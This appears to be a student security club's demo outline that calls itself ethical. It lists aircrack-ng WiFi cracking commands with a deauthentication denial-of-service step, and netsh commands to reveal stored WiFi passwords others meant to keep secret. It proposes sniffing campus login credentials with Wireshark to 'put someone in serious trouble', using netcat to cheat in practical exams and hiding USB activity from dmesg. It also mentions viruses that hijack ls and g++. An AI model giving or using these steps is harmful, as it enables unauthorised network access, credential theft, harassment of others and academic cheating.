Start off by introducing CyberCell , myself and its members 

"This is merely a demonstration to give you all an idea as to what the 
 Cyber Cell is all about and what we do . We simulate in our labs some of the 
 latest and sophistaced hacks to learn about existing vulnerabilities and
 security issues and thus to come up with patches , precautionary measures 
 and solutions in an ethical manner " 

1) First off classic Wifi hack 

Steps : 
1) ifconfig wlan0 down
2) airmon-ng check kill
3) iwconfig wlan0 mode monitor
4) ifconfig wlan0 up
5) airodump-ng wlan0
6) airodump-ng --bssid <MAC-ADDR> --channel <CHANNEL> -w <NAME_OF_FILE> wlan0
7) aireplay-ng -0 0 -a <MAC-ADDR> wlan0  <= DoS attack 
8) crunch
9) aircrack-ng

Then to fix network manager => sudo service network-manager restart


In windows , netsh wlan show profile <= shows wifi having connected to in past
	     netsh wlan show profile <WifiName> key=clear <= reveals password at Security key 
Useful when someone enters password in your device but doesn't want to let you know it .



2) Next , have you guys used the 10.125.130.101:8090 to gain internet access ?
   Well , it can show some of your sensitive info . If anyone else gets your password
   that person can put you in serious trouble ...
   What if you wanted to put someone in serious trouble , you can use Wireshark to 
   get that person's password like this : 
    [ invite some one to enter their login credentials and remind them to change it later ]






3) Next , let's do something very interesting . I'll let you all on a secret .
   There is a method to cheat during practical exams :
   
	Netcat for chat ( communication )
		   transfer programs 


4) Command over-ride 
	Sometimes people bring all programs on their USB sticks , attach it and get caught due 
	to command => dmesg -T

	We created a script that you can use to disable the command


5) 	Which OS do you think is more secure Windows or Linux ?
	( Most will probably think that Linux is more secure )
	
	Well , we have created a small virus .
	What does the ls command do ?
	
	As well as an antivirus for it .



6)	I believe all of you have started with C++ programming .
	Great ! 
	At our labs , we have developed a virus that completely modifies the 
	behaviour of the g++ compiler .
